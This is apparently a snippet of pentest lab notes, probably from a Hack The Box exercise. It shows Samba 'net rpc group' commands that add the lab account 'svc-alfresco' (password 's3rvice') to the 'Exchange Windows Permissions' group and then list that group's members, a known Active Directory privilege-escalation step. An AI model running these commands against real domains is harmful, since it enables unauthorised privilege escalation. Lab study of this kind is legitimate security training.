net rpc group addmem "TargetGroup:the group you want to be added to" "<username>" -U "DOMAIN"/"<username>"%"<Password>" -S "DomainController"

```
net rpc group addmem "Exchange Windows Permissions" "svc-alfresco" -U "htb.local"/"svc-alfresco"%"s3rvice" -S "htb.local"

```
net rpc group members "TargetGroup" -U "DOMAIN"/"<username>"%"<Password>" -S "DomainControllerName"

net rpc group members "Exchange Windows Permissions" -U "htb.local"/"svc-alfresco"%"s3rvice" -S "htb.local"
